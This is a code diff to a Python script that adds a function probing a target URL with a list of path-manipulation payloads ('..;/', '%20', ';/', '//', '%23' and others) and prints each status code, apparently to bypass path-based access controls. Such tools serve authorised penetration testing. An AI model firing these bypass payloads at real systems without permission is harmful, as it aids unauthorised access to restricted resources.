@@ -127,3 +127,31 @@ def post_content_lenght(url,path):
         print(f"Content-Length: 0 --> {url}/{path} --> {r.status_code}")
     except:
         pass
+
+def pathManipulating(url,PATH):
+    payloads = [
+        PATH+'?',
+        PATH+'??',
+        PATH+'&',
+        PATH+'%',
+        PATH+'%20',
+        PATH+'%09',
+        PATH+'/',
+        PATH+'..;/',
+        './'+PATH,
+        './'+PATH+'/',
+        PATH+'//',
+        PATH+';/',
+        PATH+'/*',
+        PATH+'/.',
+        PATH+'./.',
+        PATH+'/./',
+        PATH+'%23',
+        PATH+'~',
+        PATH+'/~',
+        PATH+'.json',
+    ]
+    for payload in payloads:
+        my_payload = f"{url}/{payload}"
+        r = requests.get(my_payload)
+        print(f"{my_payload} --> {r.status_code}")
